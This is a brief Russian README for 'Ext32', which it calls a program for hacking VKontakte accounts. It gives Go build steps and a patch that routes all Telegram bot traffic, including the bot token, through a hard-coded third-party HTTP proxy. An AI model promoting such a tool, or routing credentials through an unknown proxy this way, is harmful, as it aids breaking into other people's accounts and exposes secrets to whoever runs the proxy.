# Ext32
Ext32 - программа для взлома ВКонтакте. 

Программа написана на языке программирования Go, и использует библиотеку github.com/go-telegram-bot-api/telegram-bot-api.
Поэтому перед сборкой выполните 

go get github.com/go-telegram-bot-api/telegram-bot-api

h1 Внимание!
Так как Telegram заблокирован в России, то для работы программы вам необходимо внести некоторые изменения в код.

Скачав библиотеку github.com/go-telegram-bot-api/telegram-bot-api, откройте файл bot.go и измените следующий участок кода:

func NewBotAPIWithClient(token string, client *http.Client) (*BotAPI, error) {
	bot := &BotAPI{
		Token:  token,
		Client: client,
		Buffer: 100,
	}

	self, err := bot.GetMe()
	if err != nil {
		return nil, err
	}

	bot.Self = self

	return bot, nil
}

на

func NewBotAPIWithClient(token string, client *http.Client) (*BotAPI, error) {
	bot := &BotAPI{
		Token:  token,
		Client: client,
		Buffer: 100,
	}

	proxyUrl, _ := url.Parse("http://kvmde58-13429.fornex.org:8008")

	bot.Client = &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyUrl),
		},
	}

	self, err := bot.GetMe()
	if err != nil {
		return nil, err
	}

	bot.Self = self

	return bot, nil
}

